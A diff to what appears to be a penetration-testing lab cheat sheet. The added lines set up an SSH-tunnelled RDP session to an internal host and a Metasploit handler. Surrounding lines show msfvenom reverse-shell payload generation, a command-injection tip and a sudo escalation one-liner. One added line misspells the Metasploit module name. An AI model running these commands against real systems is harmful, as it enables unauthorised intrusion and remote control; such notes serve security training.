@@ -17,6 +17,11 @@ NMAP SCRIPTS
   /usr/share/nmap/scripts
 smb-os-discovery
 http-enum
+
+ssh -S /tmp/data data -O forward -L 9999:192.168.28.9:3389                         ###RDP TUNNEL###
+xfreerdp /v:127.0.0.1:9999 /u:comrade /glyph-cache /clipboard /dynamic-resolution
+
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 COMMAND INJECTION
 Begin all new commands with a ;
@@ -113,6 +118,7 @@ USE GHIDRA TO PERFROM ANALYSIS OF .EXE, FIND VULNERABLE FUNCTION
 Window -> Log Data Drop Down
 msfvenom -p windows/shell/reverse_tcp lhost=10.50.20.72 lport=21001 -b "\x00" -f python
 msfconsole
+use multi/hander
 set payload windows/meterpreter/reverse_tcp
 show options
 set lhost 0.0.0.0
@@ -197,6 +203,7 @@ sudo /.hidden/inventory.exe <<<$(./escalation.py)
 use payload/linux/x86/exec
 set CMD "/.secret/.verysecret.pdb"
 generate -b '\x00' -f python
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 
